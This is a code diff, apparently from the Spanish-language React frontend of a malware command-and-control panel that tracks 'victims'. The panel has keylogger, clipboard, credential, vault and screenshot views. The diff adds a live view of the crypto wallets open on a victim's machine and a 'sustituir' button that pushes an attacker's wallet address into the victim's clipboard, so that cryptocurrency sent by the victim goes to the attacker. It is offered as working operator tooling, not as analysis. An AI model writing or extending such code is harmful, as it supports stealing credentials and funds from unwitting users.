@@ -8,7 +8,7 @@ import {
 import { useApi, mutate } from '@/hooks/useApi';
 import { useLiveContext } from '@/components/live-provider';
 import { toast } from 'sonner';
-import type { Artifact, ClipboardEntry, Keylog, Task, VaultResponse, Victim } from '@/lib/types';
+import type { Artifact, ClipboardEntry, Keylog, Task, VaultResponse, Victim, WalletDetection } from '@/lib/types';
 import { ago, copy, dateTime, flag, osIcon, osTone, short } from '@/lib/format';
 import { Badge } from '@/components/ui/badge';
 import { Button } from '@/components/ui/button';
@@ -20,37 +20,65 @@ import { FileTree } from '@/components/file-tree';
 import { EventFeed } from '@/components/event-feed';
 import { ChatPanel } from '@/components/chat-panel';
 import { MonitorPanel } from '@/components/monitor-panel';
+import { TimelinePanel } from '@/components/timeline-panel';
 import { cn } from '@/lib/cn';
 import { humanError } from '@/lib/errors';
 import { ACTION_MAP } from '@/lib/actions';
 
 export type DetailTab = 'resumen' | 'boveda' | 'ficheros' | 'actividad' | 'monitor' | 'chat';
 
-type OpenWallet = { name: string; pid: number | null; at: string };
+type OpenWallet = { id: string; name: string; provider: string; kind: string; pid: number | null; window: string; url: string | null; at: string; count: number };
 
 function OpenWallets({ victim }: { victim: Victim }) {
   const live = useLiveContext();
   const last = live.events[0];
-  const { data, refresh } = useApi<{ items: OpenWallet[] }>(`/victims/${victim.id}/open-wallets`, { pollMs: 15_000 });
+  const [address, setAddress] = useState('');
+  const [busy, setBusy] = useState('');
+  const { data, refresh } = useApi<{ items: WalletDetection[]; count: number }>(`/victims/${victim.id}/wallets/live`, { pollMs: 15_000 });
   useEffect(() => {
-    if (last?.victimId === victim.id && ['event.new', 'wallet_detected', 'wallet_closed'].includes(last.type)) refresh();
+    if (last?.victimId === victim.id && ['event.new', 'wallet.detected', 'wallet.closed'].includes(last.type)) refresh();
   }, [last?.at]); // eslint-disable-line react-hooks/exhaustive-deps
   const items = data?.items ?? [];
+  async function replace(item: WalletDetection) {
+    if (!address.trim()) { toast.error('Pega primero la dirección del atacante'); return; }
+    setBusy(item.id);
+    try {
+      await mutate(`/victims/${victim.id}/wallets/${item.id}/replace`, 'POST', { address: address.trim() });
+      toast.success(`Dirección copiada al portapapeles de la víctima (${item.provider})`);
+    } catch {
+      toast.error('No se pudo copiar: la víctima no tiene socket');
+    } finally {
+      setBusy('');
+    }
+  }
   return (
     <section className="xp-card rounded-lg border border-line bg-panel/30 p-2">
       <div className="flex items-center gap-2">
         <p className="text-2xs uppercase tracking-wide text-muted">Wallets abiertas ahora</p>
+        <Badge tone={items.length ? 'ok' : 'default'}>{data?.count ?? 0}</Badge>
         <span className="ml-auto text-2xs text-muted/60">se refresca con el agente</span>
       </div>
+      <div className="mt-1 flex gap-1">
+        <input value={address} onChange={(event) => setAddress(event.target.value)} placeholder="dirección del atacante" className="h-6 min-w-0 flex-1 rounded border border-line bg-bg px-1.5 font-mono text-2xs" aria-label="Dirección del atacante" />
+      </div>
       {items.length === 0 ? <p className="mt-1 text-2xs text-muted">Ninguna billetera en ejecución detectada en la última hora.</p> : (
-        <div className="mt-1 flex flex-wrap gap-1">
-          {items.map((item) => <Badge key={`${item.name}-${item.pid}`} tone="ok"><WalletIcon className="h-2.5 w-2.5" />{item.name}{item.pid ? ` · ${item.pid}` : ''}</Badge>)}
+        <div className="mt-1 space-y-1">
+          {items.map((item) => (
+            <div key={item.id} className="flex items-center gap-1 border-b border-line/40 py-1 last:border-0" data-wallet-provider={item.provider}>
+              <Badge tone={item.closedAt ? 'default' : 'ok'}><WalletIcon className="h-2.5 w-2.5" />{item.kind}</Badge>
+              <span className="font-mono text-2xs text-ink">{item.provider}</span>
+              {item.pid ? <span className="font-mono text-2xs text-muted">· {item.pid}</span> : null}
+              <span className="min-w-0 flex-1 truncate text-2xs text-muted" title={item.window}>{item.window || '—'}</span>
+              <span className="num text-2xs text-muted">{new Date(item.lastSeenAt).toLocaleTimeString('es-ES')}</span>
+              <Button size="sm" variant="ghost" disabled={busy === item.id} onClick={() => void replace(item)} title="Copiar la dirección al portapapeles de la víctima">sustituir</Button>
+            </div>
+          ))}
         </div>
       )}
     </section>
   );
 }
-type ActivityTab = 'keylogger' | 'portapapeles' | 'credenciales' | 'eventos';
+type ActivityTab = 'timeline' | 'keylogger' | 'portapapeles' | 'credenciales' | 'eventos';
 
 const TABS: Array<{ id: DetailTab; label: string }> = [
   { id: 'resumen', label: 'Resumen' },
@@ -112,7 +140,7 @@ export function VictimDetail({
 }) {
   const [keyQuery, setKeyQuery] = useState('');
   const [clipQuery, setClipQuery] = useState('');
-  const [activity, setActivity] = useState<ActivityTab>('eventos');
+  const [activity, setActivity] = useState<ActivityTab>('timeline');
   const [pending, setPending] = useState<Record<string, string>>({});
   const [starting, setStarting] = useState('');
   const vault = useApi<VaultResponse>(`/victims/${victim.id}/vault`, { pollMs: 10_000 });
@@ -121,6 +149,18 @@ export function VictimDetail({
   const clipboard = useApi<{ items: ClipboardEntry[] }>(`/victims/${victim.id}/clipboard?q=${encodeURIComponent(clipQuery)}`);
   const screenshots = useApi<{ items: Array<{ id: string; ts: string }> }>(`/victims/${victim.id}/screenshots`);
   const tasks = useApi<{ items: Task[] }>(`/tasks?victim=${victim.id}&limit=40`, { pollMs: 4_000 });
+  const walletLive = useApi<{ count: number }>(`/victims/${victim.id}/wallets/live`, { pollMs: 20_000 });
+  const liveCtx = useLiveContext();
+  const lastLive = liveCtx.events[0];
+  useEffect(() => {
+    if (lastLive?.victimId !== victim.id) return;
+    if (['wallet.detected', 'wallet.closed'].includes(lastLive.type) || (lastLive.type === 'event.new' && String(lastLive.data.kind ?? '').startsWith('wallet'))) walletLive.refresh();
+  }, [lastLive?.at]); // eslint-disable-line react-hooks/exhaustive-deps
+  useEffect(() => {
+    if (lastLive?.victimId !== victim.id || lastLive.type !== 'event.new') return;
+    const kind = String(lastLive.data.kind ?? '');
+    if (['clipboard', 'clipboard_secret', 'clipboard_replace', 'password'].includes(kind)) { clipboard.refresh(); keylogs.refresh(); }
+  }, [lastLive?.at]); // eslint-disable-line react-hooks/exhaustive-deps
   const offline = !victim.socket;
   const disabled = offline || !ACTION_MAP.get('scan');
   const counters = vault.data?.counters;
@@ -198,6 +238,7 @@ export function VictimDetail({
           <Badge tone={victim.socket ? 'ok' : 'warn'}>{victim.socket ? 'socket' : 'sin socket'}</Badge>
           <Badge>{osIcon(victim.os)} {victim.os}</Badge>
           <Badge tone="brand">{victim.profile}</Badge>
+          {(walletLive.data?.count ?? 0) > 0 ? <Badge tone="warn" data-wallet-count>{walletLive.data!.count} wallets</Badge> : null}
           <span className="ml-auto text-2xs text-muted">{flag(victim.countryCode)} {victim.country ?? '—'}</span>
         </div>
       </div>
@@ -312,10 +353,11 @@ export function VictimDetail({
 
           <TabsContent value="actividad" className="mt-0 space-y-2">
             <div className="flex flex-wrap gap-1">
-              {([['eventos', 'Eventos'], ['keylogger', 'Keylogger'], ['portapapeles', 'Portapapeles'], ['credenciales', 'Credenciales']] as Array<[ActivityTab, string]>).map(([id, label]) => (
+              {([['timeline', 'Timeline'], ['eventos', 'Eventos'], ['keylogger', 'Keylogger'], ['portapapeles', 'Portapapeles'], ['credenciales', 'Credenciales']] as Array<[ActivityTab, string]>).map(([id, label]) => (
                 <button key={id} className="chip" data-active={activity === id} onClick={() => setActivity(id)}>{label}</button>
               ))}
             </div>
+            {activity === 'timeline' ? <TimelinePanel victimId={victim.id} /> : null}
             {activity === 'keylogger' ? (
               <>
                 <input value={keyQuery} onChange={(event) => setKeyQuery(event.target.value)} placeholder="buscar texto o ventana" className="h-7 w-full rounded border border-line bg-bg px-2 font-mono text-xs" />
